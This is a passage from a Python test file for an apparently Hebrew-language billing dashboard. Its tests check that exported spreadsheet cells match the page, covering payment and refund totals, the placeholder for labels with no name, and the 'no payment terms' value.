    info = {r[0].value: r[1].value for r in wb["פרטים"].iter_rows()}
    page = fd.list_totals("b2c", fd.filter_b2c(fd.build_view(s, TODAY)["b2c"], "", "", ""))
    assert (info['סה"כ סכום ששולם'], info['סה"כ ' + fd.REFUNDED_WORD]) == (page["money_in"], page["refunded"]) == (16000, 8000)


def test_the_file_writes_what_the_page_writes_for_a_nameless_label_and_a_company_without_terms(desk, monkeypatch):  # noqa: F811
    """QA 24.11: 2829373007's "ערוץ תשלום" holds a value whose label has no name - the page says "תווית בלי שם", the
    file's cell was empty; and the ledger file of a company without terms ("משרד העבודה") had "תנאי תשלום" empty on every
    row, where the page says "אין תנאי תשלום". The file writes what the page writes, in every status column of both."""
    nameless = sc(1, st="5", paid="0", refund="0", lead=["L1"])
    for key in ("channel", "ctype", "refund_method"):
        nameless[fd.SC[key]], nameless[fd.SC[key] + "#"] = "", "17"
    nameless[fd.SC["status"]] = nameless[fd.SC["receipt"]] = ""    # "הוחזר חלקי" and "יצאה" by their index, no name
    charge = b2(3, payment="2", due="2026-09-01")
    charge[fd.B2["billing"]] = charge[fd.B2["payment"]] = ""        # "חויב" and "לא שולם" by their index, no name
    served(monkeypatch, snap([nameless, sc(2, channel="אשראי", lead=["L1"])],
                             [charge, b2(4, payment="2", due="2026-09-01", account="A2"),
                              b2(5, payment="2", due="2026-09-01", account="")],
                             accounts=[acct("A1", ""), acct("A2", "שוטף+30")], leads=[lead("L1")]))
    word = fd.UNNAMED_LABEL
    _h, rows, _i = sheet(desk, {"tab": "b2c", "state": ""}, "תקבולים")
    assert [rows["1"][h] for h in ("ערוץ תשלום", "סוג חיוב", "אופן החזר", "סטטוס תשלום", "שליחת קבלה")] == [word] * 5
    assert rows["1"]["סכום החזר"] == 0                              # and its 0 refund is 0, as the page says (item 1)
    assert (rows["2"]["ערוץ תשלום"], rows["2"]["סטטוס תשלום"], rows["2"]["אופן החזר"]) == ("אשראי", "שולם", None)
    _h, charges, _i = sheet(desk, {"tab": "b2b", "state": ""}, "חיובים")
    assert (charges["3"]["מצב חיוב"], charges["3"]["סטטוס תשלום"]) == (word, word)
    assert (charges["4"]["מצב חיוב"], charges["4"]["סטטוס תשלום"]) == ("חויב", "לא שולם")
    # the company's terms, or "אין תנאי תשלום" where it has none; a charge with no company has no terms to lack
    assert [charges[i]["תנאי תשלום"] for i in ("3", "4", "5")] == [fd.NO_TERMS, "שוטף+30", None]
    _h, ledger, _i = sheet(desk, {"tab": "b2b", "state": "", "customer": "A1"}, "חיובים")
    assert [r["תנאי תשלום"] for r in ledger.values()] == [fd.NO_TERMS]
